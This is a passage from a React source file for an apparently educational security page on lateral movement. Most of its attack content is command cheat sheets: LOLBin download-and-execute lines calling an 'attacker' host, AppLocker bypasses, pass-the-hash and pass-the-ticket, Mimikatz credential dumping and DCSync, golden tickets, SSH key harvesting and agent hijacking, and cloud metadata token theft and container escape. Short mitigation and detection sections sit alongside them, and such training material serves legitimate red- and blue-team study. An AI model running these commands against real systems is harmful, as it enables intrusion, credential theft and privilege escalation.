                <AccordionSummary expandIcon={<ExpandMoreIcon sx={{ color: theme.info }} />} sx={accordionSummarySx(theme.info)}>
                  <StorageIcon sx={{ color: theme.info, mr: 1.5 }} />
                  <Typography variant="h6" sx={{ fontWeight: 600, color: theme.text }}>File Transfer LOLBins</Typography>
                </AccordionSummary>
                <AccordionDetails sx={{ pt: 3 }}>
                  <CodeBlock
                    language="powershell"
                    title="File Download Methods"
                    code={`# certutil - Download files
certutil -urlcache -split -f http://attacker/file.exe C:\\Windows\\Temp\\file.exe

# bitsadmin - Background transfer
bitsadmin /transfer job /download /priority high http://attacker/file.exe C:\\file.exe

# PowerShell - Multiple methods
Invoke-WebRequest -Uri http://attacker/file.exe -OutFile C:\\file.exe
(New-Object Net.WebClient).DownloadFile('http://attacker/file.exe','C:\\file.exe')
(New-Object Net.WebClient).DownloadString('http://attacker/script.ps1') | IEX

# curl (Windows 10+)
curl http://attacker/file.exe -o C:\\file.exe

# SMB file copy
copy \\\\attacker\\share\\file.exe C:\\Temp\\file.exe
xcopy \\\\SOURCE\\C$\\tools C:\\tools /E /Y

# esentutl - Copy locked files
esentutl.exe /y C:\\Windows\\ntds\\ntds.dit /d C:\\temp\\ntds.dit /o`}
                  />
                  <TableContainer component={Paper} sx={{ mt: 2, bgcolor: "transparent", borderRadius: 2, border: `1px solid ${alpha(theme.info, 0.2)}` }}>
                    <Table size="small">
                      <TableHead>
                        <TableRow sx={{ bgcolor: alpha(theme.info, 0.1) }}>
                          <TableCell sx={{ color: theme.info, fontWeight: 700 }}>Binary</TableCell>
                          <TableCell sx={{ color: theme.info, fontWeight: 700 }}>Download</TableCell>
                          <TableCell sx={{ color: theme.info, fontWeight: 700 }}>Upload</TableCell>
                          <TableCell sx={{ color: theme.info, fontWeight: 700 }}>Notes</TableCell>
                        </TableRow>
                      </TableHead>
                      <TableBody>
                        {[
                          ["certutil", "✅", "❌", "URL cache, base64 encode/decode"],
                          ["bitsadmin", "✅", "✅", "Background transfer, persistent"],
                          ["PowerShell", "✅", "✅", "Most flexible, heavily logged"],
                          ["curl", "✅", "✅", "Windows 10+ only"],
                          ["esentutl", "✅", "❌", "Copy locked files (NTDS.dit)"],
                        ].map(([bin, dl, ul, notes], i) => (
                          <TableRow key={bin} sx={{ bgcolor: i % 2 === 0 ? "transparent" : alpha(theme.info, 0.03) }}>
                            <TableCell sx={{ color: theme.info, fontFamily: "monospace", fontWeight: 600 }}>{bin}</TableCell>
                            <TableCell>{dl}</TableCell>
                            <TableCell>{ul}</TableCell>
                            <TableCell sx={{ color: theme.textMuted }}>{notes}</TableCell>
                          </TableRow>
                        ))}
                      </TableBody>
                    </Table>
                  </TableContainer>
                </AccordionDetails>
              </Accordion>

              <Accordion sx={accordionSx(theme.accent)}>
                <AccordionSummary expandIcon={<ExpandMoreIcon sx={{ color: theme.accent }} />} sx={accordionSummarySx(theme.accent)}>
                  <TerminalIcon sx={{ color: theme.accent, mr: 1.5 }} />
                  <Typography variant="h6" sx={{ fontWeight: 600, color: theme.text }}>Code Execution LOLBins</Typography>
                </AccordionSummary>
                <AccordionDetails sx={{ pt: 3 }}>
                  <CodeBlock
                    language="cmd"
                    title="Local Code Execution"
                    code={`# mshta - Execute HTA
mshta http://attacker/payload.hta
mshta vbscript:Execute("CreateObject(""Wscript.Shell"").Run ""calc"":close")

# rundll32 - Execute DLL
rundll32.exe javascript:"\\..\\mshtml,RunHTMLApplication ";alert('test')
rundll32.exe shell32.dll,Control_RunDLL payload.dll

# regsvr32 - Script execution
regsvr32 /s /n /u /i:http://attacker/file.sct scrobj.dll

# cmstp - Profile installation
cmstp.exe /ni /s c:\\cmstp.inf

# msiexec - Install MSI
msiexec /q /i http://attacker/payload.msi

# forfiles - Command execution
forfiles /p c:\\windows\\system32 /m notepad.exe /c "calc.exe"

# pcalua - Program Compatibility Assistant
pcalua.exe -a calc.exe`}
                  />
                </AccordionDetails>
              </Accordion>

              <Accordion sx={accordionSx(theme.warning)}>
                <AccordionSummary expandIcon={<ExpandMoreIcon sx={{ color: theme.warning }} />} sx={accordionSummarySx(theme.warning)}>
                  <SecurityIcon sx={{ color: theme.warning, mr: 1.5 }} />
                  <Typography variant="h6" sx={{ fontWeight: 600, color: theme.text }}>AppLocker/WDAC Bypass</Typography>
                </AccordionSummary>
                <AccordionDetails sx={{ pt: 3 }}>
                  <CodeBlock
                    language="powershell"
                    title="Bypass Techniques"
                    code={`# MSBuild - Build and execute
# Create payload.xml with inline task, then:
C:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\MSBuild.exe payload.xml

# InstallUtil - Run .NET assembly
C:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\InstallUtil.exe /logfile= /LogToConsole=false /U payload.exe

# Regasm/Regsvcs
C:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\regasm.exe /U payload.dll
C:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\regsvcs.exe payload.dll

# CMSTP bypass
cmstp.exe /ni /s payload.inf

# Trusted directories
# Copy to: C:\\Windows\\Tasks\\ or C:\\Windows\\Temp\\`}
                  />
                </AccordionDetails>
              </Accordion>

              <Accordion sx={accordionSx(theme.success)}>
                <AccordionSummary expandIcon={<ExpandMoreIcon sx={{ color: theme.success }} />} sx={accordionSummarySx(theme.success)}>
                  <StorageIcon sx={{ color: theme.success, mr: 1.5 }} />
                  <Typography variant="h6" sx={{ fontWeight: 600, color: theme.text }}>GTFOBins Reference</Typography>
                </AccordionSummary>
                <AccordionDetails sx={{ pt: 3 }}>
                  <Alert severity="info" sx={{ mb: 2, bgcolor: alpha(theme.info, 0.1), border: `1px solid ${alpha(theme.info, 0.3)}` }}>
                    <strong>GTFOBins</strong> is a curated list of Unix binaries that can be exploited. <strong>LOLBAS</strong> is the Windows equivalent.
                  </Alert>
                  <Grid container spacing={2}>
                    {[
                      { name: "lolbas-project.github.io", desc: "Windows LOLBins database", color: theme.info },
                      { name: "gtfobins.github.io", desc: "Unix GTFOBins database", color: theme.success },
                      { name: "filesec.io", desc: "File extension security", color: theme.warning },
                    ].map((site) => (
                      <Grid item xs={12} md={4} key={site.name}>
                        <Paper sx={{ p: 2, bgcolor: theme.bgNested, border: `1px solid ${alpha(site.color, 0.3)}`, borderRadius: 2 }}>
                          <Typography sx={{ color: site.color, fontWeight: 600, fontFamily: "monospace" }}>{site.name}</Typography>
                          <Typography variant="caption" sx={{ color: theme.textMuted }}>{site.desc}</Typography>
                        </Paper>
                      </Grid>
                    ))}
                  </Grid>
                </AccordionDetails>
              </Accordion>

              <Accordion sx={accordionSx(theme.warning)}>
                <AccordionSummary expandIcon={<ExpandMoreIcon sx={{ color: theme.warning }} />} sx={accordionSummarySx(theme.warning)}>
                  <WarningIcon sx={{ color: theme.warning, mr: 1.5 }} />
                  <Typography variant="h6" sx={{ fontWeight: 600, color: theme.text }}>LOLBins Detection Tips</Typography>
                </AccordionSummary>
                <AccordionDetails sx={{ pt: 3 }}>
                  <List dense>
                    {lolbinDetections.map((item) => (
                      <ListItem key={item} sx={{ py: 0.5, px: 0 }}>
                        <ListItemIcon sx={{ minWidth: 32 }}>
                          <CheckCircleIcon sx={{ color: theme.warning, fontSize: 16 }} />
                        </ListItemIcon>
                        <ListItemText primary={item} sx={{ "& .MuiListItemText-primary": { color: theme.textMuted, fontSize: "0.9rem" } }} />
                      </ListItem>
                    ))}
                  </List>
                </AccordionDetails>
              </Accordion>
            </Box>
          </TabPanel>

          {/* Tab 3: Credential Attacks */}
          <TabPanel value={tabValue} index={3}>
            <Box sx={{ p: 3 }}>
              <Box sx={{ mb: 4 }}>
                <Box sx={{ display: "flex", alignItems: "center", gap: 2, mb: 1 }}>
                  <VpnKeyIcon sx={{ color: theme.primary }} />
                  <Typography variant="h5" sx={{ fontWeight: 700, background: `linear-gradient(135deg, ${theme.primary} 0%, ${theme.secondary} 100%)`, backgroundClip: "text", WebkitBackgroundClip: "text", color: "transparent" }}>
                    Credential-Based Attacks
                  </Typography>
                </Box>
                <Divider sx={{ mt: 2, borderColor: theme.border }} />
              </Box>

              <Accordion defaultExpanded sx={accordionSx(theme.primary)}>
                <AccordionSummary expandIcon={<ExpandMoreIcon sx={{ color: theme.primary }} />} sx={accordionSummarySx(theme.primary)}>
                  <VpnKeyIcon sx={{ color: theme.primary, mr: 1.5 }} />
                  <Typography variant="h6" sx={{ fontWeight: 600, color: theme.text }}>Pass-the-Hash (PtH)</Typography>
                </AccordionSummary>
                <AccordionDetails sx={{ pt: 3 }}>
                  <Typography sx={{ color: theme.textMuted, mb: 2, lineHeight: 1.7 }}>
                    Pass-the-Hash uses NTLM hashes to authenticate without knowing the plaintext password. Works with SMB, WMI, and other NTLM protocols.
                  </Typography>
                  <CodeBlock
                    language="bash"
                    title="Pass-the-Hash Techniques"
                    code={`# Impacket - Various tools with PtH
psexec.py -hashes :NTLM_HASH DOMAIN/user@TARGET
wmiexec.py -hashes :NTLM_HASH DOMAIN/user@TARGET
smbexec.py -hashes :NTLM_HASH DOMAIN/user@TARGET
atexec.py -hashes :NTLM_HASH DOMAIN/user@TARGET "whoami"

# CrackMapExec - Mass PtH
crackmapexec smb TARGETS -u user -H NTLM_HASH
crackmapexec smb TARGETS -u user -H NTLM_HASH -x "whoami"
crackmapexec smb TARGETS -u user -H NTLM_HASH --sam

# Evil-WinRM with hash
evil-winrm -i TARGET -u user -H NTLM_HASH

# Mimikatz - PtH to spawn process
sekurlsa::pth /user:admin /domain:DOMAIN /ntlm:HASH /run:cmd.exe

# xfreerdp - RDP with hash (requires Restricted Admin)
xfreerdp /u:user /pth:HASH /v:TARGET`}
                  />
                  <Alert severity="warning" sx={{ mt: 2, bgcolor: alpha(theme.warning, 0.1), border: `1px solid ${alpha(theme.warning, 0.3)}` }}>
                    <strong>Mitigations:</strong> Credential Guard, Protected Users group, disabling NTLM.
                  </Alert>
                </AccordionDetails>
              </Accordion>

              <Accordion sx={accordionSx(theme.accent)}>
                <AccordionSummary expandIcon={<ExpandMoreIcon sx={{ color: theme.accent }} />} sx={accordionSummarySx(theme.accent)}>
                  <VpnKeyIcon sx={{ color: theme.accent, mr: 1.5 }} />
                  <Typography variant="h6" sx={{ fontWeight: 600, color: theme.text }}>Pass-the-Ticket (PtT)</Typography>
                </AccordionSummary>
                <AccordionDetails sx={{ pt: 3 }}>
                  <Typography sx={{ color: theme.textMuted, mb: 2 }}>
                    Pass-the-Ticket injects stolen Kerberos tickets into the current session. Works with TGT or service tickets.
                  </Typography>
                  <CodeBlock
                    language="powershell"
                    title="Kerberos Ticket Attacks"
                    code={`# Mimikatz - Export tickets
sekurlsa::tickets /export
kerberos::list /export

# Mimikatz - Import/Pass ticket
kerberos::ptt ticket.kirbi

# Rubeus - Pass the ticket
Rubeus.exe ptt /ticket:ticket.kirbi
Rubeus.exe ptt /ticket:BASE64_TICKET

# Impacket - Request and use tickets
getTGT.py DOMAIN/user:password -dc-ip DC_IP
export KRB5CCNAME=user.ccache
psexec.py -k -no-pass DOMAIN/user@TARGET

# Convert ticket formats
ticketConverter.py ticket.kirbi ticket.ccache`}
                  />
                </AccordionDetails>
              </Accordion>

              <Accordion sx={accordionSx(theme.warning)}>
                <AccordionSummary expandIcon={<ExpandMoreIcon sx={{ color: theme.warning }} />} sx={accordionSummarySx(theme.warning)}>
                  <VpnKeyIcon sx={{ color: theme.warning, mr: 1.5 }} />
                  <Typography variant="h6" sx={{ fontWeight: 600, color: theme.text }}>Credential Dumping</Typography>
                </AccordionSummary>
                <AccordionDetails sx={{ pt: 3 }}>
                  <CodeBlock
                    language="powershell"
                    title="Credential Extraction"
                    code={`# Mimikatz - Dump LSASS
privilege::debug
sekurlsa::logonpasswords
sekurlsa::wdigest
sekurlsa::kerberos

# Mimikatz - Dump SAM
lsadump::sam
lsadump::secrets
lsadump::cache

# Mimikatz - DCSync (Domain Admin required)
lsadump::dcsync /user:DOMAIN\\Administrator
lsadump::dcsync /all /csv

# secretsdump.py - Remote dump
secretsdump.py DOMAIN/user:password@TARGET
secretsdump.py -hashes :HASH DOMAIN/user@TARGET
secretsdump.py -just-dc DOMAIN/user:password@DC

# CrackMapExec credential dump
crackmapexec smb TARGET -u user -p pass --sam
crackmapexec smb TARGET -u user -p pass --lsa
crackmapexec smb TARGET -u user -p pass --ntds`}
                  />
                </AccordionDetails>
              </Accordion>

              <Accordion sx={accordionSx(theme.info)}>
                <AccordionSummary expandIcon={<ExpandMoreIcon sx={{ color: theme.info }} />} sx={accordionSummarySx(theme.info)}>
                  <SecurityIcon sx={{ color: theme.info, mr: 1.5 }} />
                  <Typography variant="h6" sx={{ fontWeight: 600, color: theme.text }}>Kerberos Attacks</Typography>
                </AccordionSummary>
                <AccordionDetails sx={{ pt: 3 }}>
                  <Grid container spacing={2} sx={{ mb: 3 }}>
                    {[
                      { title: "Kerberoasting", desc: "Request TGS, crack offline", color: theme.primary },
                      { title: "AS-REP Roasting", desc: "No pre-auth accounts", color: theme.warning },
                      { title: "Golden Ticket", desc: "Forge TGT with krbtgt hash", color: theme.accent },
                      { title: "Silver Ticket", desc: "Forge TGS for service", color: theme.info },
                    ].map((item) => (
                      <Grid item xs={6} md={3} key={item.title}>
                        <Paper sx={{ p: 2, bgcolor: theme.bgNested, border: `1px solid ${alpha(item.color, 0.3)}`, borderRadius: 2, "&::before": { content: '""', position: "absolute", top: 0, left: 0, right: 0, height: "3px", bgcolor: item.color }, position: "relative", overflow: "hidden" }}>
                          <Typography sx={{ color: item.color, fontWeight: 700 }}>{item.title}</Typography>
                          <Typography variant="caption" sx={{ color: theme.textMuted }}>{item.desc}</Typography>
                        </Paper>
                      </Grid>
                    ))}
                  </Grid>
                  <CodeBlock
                    language="bash"
                    title="Kerberos Attack Commands"
                    code={`# Kerberoasting
GetUserSPNs.py DOMAIN/user:password -dc-ip DC -request
Rubeus.exe kerberoast /outfile:hashes.txt

# AS-REP Roasting
GetNPUsers.py DOMAIN/ -usersfile users.txt -dc-ip DC -format hashcat
Rubeus.exe asreproast /format:hashcat /outfile:hashes.txt

# Golden Ticket
ticketer.py -nthash KRBTGT_HASH -domain-sid S-1-5-21-... -domain DOMAIN Administrator
mimikatz# kerberos::golden /user:Administrator /domain:DOMAIN /sid:S-1-5-21-... /krbtgt:HASH /ptt

# Silver Ticket
ticketer.py -nthash SERVICE_HASH -domain-sid S-1-5-21-... -domain DOMAIN -spn cifs/target.domain.local Administrator`}
                  />
                </AccordionDetails>
              </Accordion>

              <Accordion sx={accordionSx(theme.success)}>
                <AccordionSummary expandIcon={<ExpandMoreIcon sx={{ color: theme.success }} />} sx={accordionSummarySx(theme.success)}>
                  <VpnKeyIcon sx={{ color: theme.success, mr: 1.5 }} />
                  <Typography variant="h6" sx={{ fontWeight: 600, color: theme.text }}>Token Manipulation</Typography>
                </AccordionSummary>
                <AccordionDetails sx={{ pt: 3 }}>
                  <CodeBlock
                    language="powershell"
                    title="Token Impersonation"
                    code={`# Mimikatz - Token manipulation
privilege::debug
token::elevate
token::list
token::impersonate /user:DOMAIN\\Administrator

# Incognito (Meterpreter)
load incognito
list_tokens -u
impersonate_token "DOMAIN\\Administrator"

# PowerShell - Token manipulation
[System.Security.Principal.WindowsIdentity]::GetCurrent()

# Rubeus - Create logon session with ticket
Rubeus.exe createnetonly /program:cmd.exe /show
Rubeus.exe ptt /luid:0x123456 /ticket:ticket.kirbi`}
                  />
                </AccordionDetails>
              </Accordion>

              <Accordion sx={accordionSx(theme.warning)}>
                <AccordionSummary expandIcon={<ExpandMoreIcon sx={{ color: theme.warning }} />} sx={accordionSummarySx(theme.warning)}>
                  <SecurityIcon sx={{ color: theme.warning, mr: 1.5 }} />
                  <Typography variant="h6" sx={{ fontWeight: 600, color: theme.text }}>Detection Signals</Typography>
                </AccordionSummary>
                <AccordionDetails sx={{ pt: 3 }}>
                  <List dense>
                    {credentialDetection.map((item) => (
                      <ListItem key={item} sx={{ py: 0.5, px: 0 }}>
                        <ListItemIcon sx={{ minWidth: 32 }}>
                          <CheckCircleIcon sx={{ color: theme.warning, fontSize: 16 }} />
                        </ListItemIcon>
                        <ListItemText primary={item} sx={{ "& .MuiListItemText-primary": { color: theme.textMuted, fontSize: "0.9rem" } }} />
                      </ListItem>
                    ))}
                  </List>
                </AccordionDetails>
              </Accordion>
            </Box>
          </TabPanel>

          {/* Tab 4: Linux/SSH */}
          <TabPanel value={tabValue} index={4}>
            <Box sx={{ p: 3 }}>
              <Box sx={{ mb: 4 }}>
                <Box sx={{ display: "flex", alignItems: "center", gap: 2, mb: 1 }}>
                  <StorageIcon sx={{ color: theme.primary }} />
                  <Typography variant="h5" sx={{ fontWeight: 700, background: `linear-gradient(135deg, ${theme.primary} 0%, ${theme.secondary} 100%)`, backgroundClip: "text", WebkitBackgroundClip: "text", color: "transparent" }}>
                    Linux / SSH Lateral Movement
                  </Typography>
                </Box>
                <Divider sx={{ mt: 2, borderColor: theme.border }} />
              </Box>

              <Accordion defaultExpanded sx={accordionSx(theme.success)}>
                <AccordionSummary expandIcon={<ExpandMoreIcon sx={{ color: theme.success }} />} sx={accordionSummarySx(theme.success)}>
                  <TerminalIcon sx={{ color: theme.success, mr: 1.5 }} />
                  <Typography variant="h6" sx={{ fontWeight: 600, color: theme.text }}>SSH Tunneling & Port Forwarding</Typography>
                </AccordionSummary>
                <AccordionDetails sx={{ pt: 3 }}>
                  <CodeBlock
                    language="bash"
                    title="SSH Tunneling Techniques"
                    code={`# Local Port Forwarding - Access remote service locally
ssh -L 8080:internal-server:80 user@jump-host
# Access internal-server:80 via localhost:8080

# Remote Port Forwarding - Expose local service remotely
ssh -R 9090:localhost:22 user@attacker-server
# Connect to attacker-server:9090 to reach victim:22

# Dynamic Port Forwarding (SOCKS Proxy)
ssh -D 1080 user@jump-host
# Configure browser/tools to use localhost:1080 as SOCKS proxy

# ProxyChains with SSH SOCKS
echo "socks5 127.0.0.1 1080" >> /etc/proxychains.conf
proxychains nmap -sT internal-network

# SSH through multiple hops
ssh -J user@jump1,user@jump2 user@final-target

# Persistent tunnel with autossh
autossh -M 0 -f -N -D 1080 user@jump-host`}
                  />
                </AccordionDetails>
              </Accordion>

              <Accordion sx={accordionSx(theme.warning)}>
                <AccordionSummary expandIcon={<ExpandMoreIcon sx={{ color: theme.warning }} />} sx={accordionSummarySx(theme.warning)}>
                  <VpnKeyIcon sx={{ color: theme.warning, mr: 1.5 }} />
                  <Typography variant="h6" sx={{ fontWeight: 600, color: theme.text }}>SSH Key Harvesting</Typography>
                </AccordionSummary>
                <AccordionDetails sx={{ pt: 3 }}>
                  <CodeBlock
                    language="bash"
                    title="Finding SSH Keys"
                    code={`# Common SSH key locations
cat ~/.ssh/id_rsa
cat ~/.ssh/id_ecdsa
cat ~/.ssh/id_ed25519
cat /root/.ssh/id_rsa

# Find all SSH keys on system
find / -name "id_rsa" 2>/dev/null
find / -name "id_ecdsa" 2>/dev/null
find / -name "*.pem" 2>/dev/null
find / -type f -name "authorized_keys" 2>/dev/null

# Check SSH config for hosts
cat ~/.ssh/config
cat /etc/ssh/ssh_config

# Check known_hosts for targets
cat ~/.ssh/known_hosts
# Unhash if hashed: ssh-keygen -H -F hostname

# Search for keys in memory
strings /proc/*/maps 2>/dev/null | grep -i ssh

# Find SSH agent socket
echo $SSH_AUTH_SOCK
ls -la /tmp/ssh-*`}
                  />
                </AccordionDetails>
              </Accordion>

              <Accordion sx={accordionSx(theme.info)}>
                <AccordionSummary expandIcon={<ExpandMoreIcon sx={{ color: theme.info }} />} sx={accordionSummarySx(theme.info)}>
                  <TerminalIcon sx={{ color: theme.info, mr: 1.5 }} />
                  <Typography variant="h6" sx={{ fontWeight: 600, color: theme.text }}>Remote Execution Methods</Typography>
                </AccordionSummary>
                <AccordionDetails sx={{ pt: 3 }}>
                  <CodeBlock
                    language="bash"
                    title="Linux Remote Execution"
                    code={`# SSH command execution
ssh user@target "whoami; hostname; id"
ssh -i key.pem user@target "cat /etc/shadow"

# SSH with password (sshpass)
sshpass -p 'password' ssh user@target

# Execute script remotely
ssh user@target 'bash -s' < local_script.sh

# SCP file transfer
scp file.txt user@target:/tmp/
scp -r folder/ user@target:/tmp/

# rsync for efficient transfer
rsync -avz local/ user@target:/remote/

# Ansible ad-hoc commands
ansible target -m shell -a "whoami" -u user -k

# Remote shell with Python
python3 -c 'import pty; pty.spawn("/bin/bash")'`}
                  />
                </AccordionDetails>
              </Accordion>

              <Accordion sx={accordionSx(theme.primary)}>
                <AccordionSummary expandIcon={<ExpandMoreIcon sx={{ color: theme.primary }} />} sx={accordionSummarySx(theme.primary)}>
                  <SecurityIcon sx={{ color: theme.primary, mr: 1.5 }} />
                  <Typography variant="h6" sx={{ fontWeight: 600, color: theme.text }}>Credential Locations</Typography>
                </AccordionSummary>
                <AccordionDetails sx={{ pt: 3 }}>
                  <TableContainer component={Paper} sx={{ bgcolor: "transparent", borderRadius: 2, border: `1px solid ${alpha(theme.primary, 0.2)}` }}>
                    <Table size="small">
                      <TableHead>
                        <TableRow sx={{ bgcolor: alpha(theme.primary, 0.1) }}>
                          <TableCell sx={{ color: theme.primary, fontWeight: 700 }}>File</TableCell>
                          <TableCell sx={{ color: theme.primary, fontWeight: 700 }}>Contents</TableCell>
                        </TableRow>
                      </TableHead>
                      <TableBody>
                        {[
                          ["/etc/passwd", "User accounts"],
                          ["/etc/shadow", "Password hashes (root only)"],
                          ["~/.bash_history", "Command history with passwords"],
                          ["~/.ssh/", "SSH keys and config"],
                          ["/etc/ssh/sshd_config", "SSH server configuration"],
                          ["~/.gnupg/", "GPG keys"],
                          ["/var/log/auth.log", "Authentication logs"],
                          ["~/.aws/credentials", "AWS credentials"],
                        ].map(([file, content], i) => (
                          <TableRow key={file} sx={{ bgcolor: i % 2 === 0 ? "transparent" : alpha(theme.primary, 0.03) }}>
                            <TableCell sx={{ color: theme.info, fontFamily: "monospace" }}>{file}</TableCell>
                            <TableCell sx={{ color: theme.textMuted }}>{content}</TableCell>
                          </TableRow>
                        ))}
                      </TableBody>
                    </Table>
                  </TableContainer>
                </AccordionDetails>
              </Accordion>

              <Accordion sx={accordionSx(theme.accent)}>
                <AccordionSummary expandIcon={<ExpandMoreIcon sx={{ color: theme.accent }} />} sx={accordionSummarySx(theme.accent)}>
                  <AccountTreeIcon sx={{ color: theme.accent, mr: 1.5 }} />
                  <Typography variant="h6" sx={{ fontWeight: 600, color: theme.text }}>SSH Agent Hijacking</Typography>
                </AccordionSummary>
                <AccordionDetails sx={{ pt: 3 }}>
                  <CodeBlock
                    language="bash"
                    title="SSH Agent Exploitation"
                    code={`# Find SSH agent sockets
find /tmp -type s -name "agent.*" 2>/dev/null

# Hijack another user's agent (requires root)
SSH_AUTH_SOCK=/tmp/ssh-XXXX/agent.1234 ssh-add -l
SSH_AUTH_SOCK=/tmp/ssh-XXXX/agent.1234 ssh user@target

# Add your key to their agent
SSH_AUTH_SOCK=/tmp/ssh-XXXX/agent.1234 ssh-add ~/.ssh/id_rsa

# ControlMaster socket hijacking
# If SSH config has: ControlPath ~/.ssh/sockets/%r@%h-%p
ssh -S /path/to/socket target`}
                  />
                </AccordionDetails>
              </Accordion>

              <Accordion sx={accordionSx(theme.success)}>
                <AccordionSummary expandIcon={<ExpandMoreIcon sx={{ color: theme.success }} />} sx={accordionSummarySx(theme.success)}>
                  <CheckCircleIcon sx={{ color: theme.success, mr: 1.5 }} />
                  <Typography variant="h6" sx={{ fontWeight: 600, color: theme.text }}>Linux Movement Signals</Typography>
                </AccordionSummary>
                <AccordionDetails sx={{ pt: 3 }}>
                  <List dense>
                    {linuxMovementPatterns.map((item) => (
                      <ListItem key={item} sx={{ py: 0.5, px: 0 }}>
                        <ListItemIcon sx={{ minWidth: 32 }}>
                          <CheckCircleIcon sx={{ color: theme.success, fontSize: 16 }} />
                        </ListItemIcon>
                        <ListItemText primary={item} sx={{ "& .MuiListItemText-primary": { color: theme.textMuted, fontSize: "0.9rem" } }} />
                      </ListItem>
                    ))}
                  </List>
                </AccordionDetails>
              </Accordion>
            </Box>
          </TabPanel>

          {/* Tab 5: Cloud Pivoting */}
          <TabPanel value={tabValue} index={5}>
            <Box sx={{ p: 3 }}>
              <Box sx={{ mb: 4 }}>
                <Box sx={{ display: "flex", alignItems: "center", gap: 2, mb: 1 }}>
                  <CloudIcon sx={{ color: theme.primary }} />
                  <Typography variant="h5" sx={{ fontWeight: 700, background: `linear-gradient(135deg, ${theme.primary} 0%, ${theme.secondary} 100%)`, backgroundClip: "text", WebkitBackgroundClip: "text", color: "transparent" }}>
                    Cloud Pivoting & Container Escape
                  </Typography>
                </Box>
                <Divider sx={{ mt: 2, borderColor: theme.border }} />
              </Box>

              <Accordion defaultExpanded sx={accordionSx(theme.warning)}>
                <AccordionSummary expandIcon={<ExpandMoreIcon sx={{ color: theme.warning }} />} sx={accordionSummarySx(theme.warning)}>
                  <CloudIcon sx={{ color: theme.warning, mr: 1.5 }} />
                  <Typography variant="h6" sx={{ fontWeight: 600, color: theme.text }}>AWS Lateral Movement</Typography>
                </AccordionSummary>
                <AccordionDetails sx={{ pt: 3 }}>
                  <CodeBlock
                    language="bash"
                    title="AWS Pivoting Techniques"
                    code={`# Instance Metadata Service (IMDS)
curl http://169.254.169.254/latest/meta-data/
curl http://169.254.169.254/latest/meta-data/iam/security-credentials/
curl http://169.254.169.254/latest/meta-data/iam/security-credentials/ROLE_NAME

# IMDSv2 (requires token)
TOKEN=$(curl -X PUT "http://169.254.169.254/latest/api/token" -H "X-aws-ec2-metadata-token-ttl-seconds: 21600")
curl -H "X-aws-ec2-metadata-token: $TOKEN" http://169.254.169.254/latest/meta-data/

# Enumerate with stolen credentials
export AWS_ACCESS_KEY_ID="AKIA..."
export AWS_SECRET_ACCESS_KEY="..."
export AWS_SESSION_TOKEN="..."  # If using temporary creds
aws sts get-caller-identity
aws ec2 describe-instances
aws s3 ls
aws iam list-users

# SSM for lateral movement
aws ssm describe-instance-information
aws ssm start-session --target i-0123456789abcdef

# Lambda pivoting
aws lambda list-functions
aws lambda invoke --function-name FUNC_NAME output.txt`}
                  />
                </AccordionDetails>
              </Accordion>

              <Accordion sx={accordionSx(theme.info)}>
                <AccordionSummary expandIcon={<ExpandMoreIcon sx={{ color: theme.info }} />} sx={accordionSummarySx(theme.info)}>
                  <CloudIcon sx={{ color: theme.info, mr: 1.5 }} />
                  <Typography variant="h6" sx={{ fontWeight: 600, color: theme.text }}>Azure Lateral Movement</Typography>
                </AccordionSummary>
                <AccordionDetails sx={{ pt: 3 }}>
                  <CodeBlock
                    language="bash"
                    title="Azure Pivoting"
                    code={`# Azure Instance Metadata (IMDS)
curl -H "Metadata:true" "http://169.254.169.254/metadata/instance?api-version=2021-02-01"

# Get access token from IMDS
curl -H "Metadata:true" "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/"

# Use token with Azure CLI
az login --identity
az account list
az vm list
az storage account list

# Enumerate with stolen token
export AZURE_ACCESS_TOKEN="eyJ..."
az rest --method GET --url https://management.azure.com/subscriptions?api-version=2020-01-01 --headers "Authorization=Bearer $AZURE_ACCESS_TOKEN"

# Azure AD enumeration
az ad user list
az ad group list
az role assignment list`}
                  />
                </AccordionDetails>
              </Accordion>

              <Accordion sx={accordionSx(theme.success)}>
                <AccordionSummary expandIcon={<ExpandMoreIcon sx={{ color: theme.success }} />} sx={accordionSummarySx(theme.success)}>
                  <CloudIcon sx={{ color: theme.success, mr: 1.5 }} />
                  <Typography variant="h6" sx={{ fontWeight: 600, color: theme.text }}>GCP Lateral Movement</Typography>
                </AccordionSummary>
                <AccordionDetails sx={{ pt: 3 }}>
                  <CodeBlock
                    language="bash"
                    title="GCP Pivoting"
                    code={`# GCP Metadata Server
curl -H "Metadata-Flavor: Google" http://169.254.169.254/computeMetadata/v1/
curl -H "Metadata-Flavor: Google" http://169.254.169.254/computeMetadata/v1/instance/service-accounts/default/token

# List instances
gcloud compute instances list
gcloud compute instances describe INSTANCE --zone ZONE

# SSH into instances
gcloud compute ssh INSTANCE --zone ZONE

# Service account impersonation
gcloud auth print-access-token --impersonate-service-account=SA@project.iam.gserviceaccount.com

# Storage buckets
gsutil ls
gsutil ls gs://bucket-name`}
                  />
                </AccordionDetails>
              </Accordion>

              <Accordion sx={accordionSx(theme.accent)}>
                <AccordionSummary expandIcon={<ExpandMoreIcon sx={{ color: theme.accent }} />} sx={accordionSummarySx(theme.accent)}>
                  <StorageIcon sx={{ color: theme.accent, mr: 1.5 }} />
                  <Typography variant="h6" sx={{ fontWeight: 600, color: theme.text }}>Container Escape & Kubernetes</Typography>
                </AccordionSummary>
                <AccordionDetails sx={{ pt: 3 }}>
                  <CodeBlock
                    language="bash"
                    title="Container Lateral Movement"
                    code={`# Check if in container
cat /proc/1/cgroup
ls -la /.dockerenv

# Escape via mounted Docker socket
docker -H unix:///var/run/docker.sock ps
docker -H unix:///var/run/docker.sock run -v /:/host -it alpine chroot /host

# Kubernetes service account token
cat /var/run/secrets/kubernetes.io/serviceaccount/token
cat /var/run/secrets/kubernetes.io/serviceaccount/namespace

# Kubernetes API enumeration
KUBE_TOKEN=$(cat /var/run/secrets/kubernetes.io/serviceaccount/token)
curl -k -H "Authorization: Bearer $KUBE_TOKEN" https://kubernetes.default.svc/api/v1/namespaces

# kubectl from inside pod
kubectl auth can-i --list
kubectl get pods --all-namespaces
kubectl get secrets --all-namespaces

# Privileged container escape
# If privileged: mount host filesystem
mount /dev/sda1 /mnt
chroot /mnt`}
                  />
                </AccordionDetails>
              </Accordion>

              <Accordion sx={accordionSx(theme.primary)}>
                <AccordionSummary expandIcon={<ExpandMoreIcon sx={{ color: theme.primary }} />} sx={accordionSummarySx(theme.primary)}>
